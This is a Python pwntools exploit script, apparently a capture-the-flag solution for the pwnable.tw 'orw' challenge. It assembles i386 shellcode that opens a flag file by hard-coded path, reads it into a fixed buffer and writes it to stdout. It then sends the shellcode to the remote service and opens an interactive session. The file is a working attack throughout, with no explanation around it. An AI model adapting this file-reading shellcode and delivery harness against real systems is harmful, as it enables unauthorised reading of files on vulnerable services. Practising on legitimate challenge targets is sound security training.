#! /usr/bin/python
from pwn import *

context.update(
        arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "chall.pwnable.tw"
PORT = 10100

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

   

def exploit(p):
    

    shellcode = asm("""
        push 0x0
        push 0x67616c66
        push 0x2f77726f
        push 0x2f656d6f
        push 0x682f2f2f
        mov ebx, esp
        xor ecx, ecx
        mov eax, 0x5
        int 0x80

        mov ebx, eax
        mov ecx, 0x804a040
        mov edx, 0x28
        mov eax, 0x3
        int 0x80 

        mov ebx, 1
        mov ecx, 0x804a040
        mov edx, 0x28
        mov eax, 0x4
        int 0x80

    """)

    ru(p,b"Give my your shellcode:")
    sl(p,shellcode)
    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    #l = ELF("./libc.so.6")

    exploit(p)
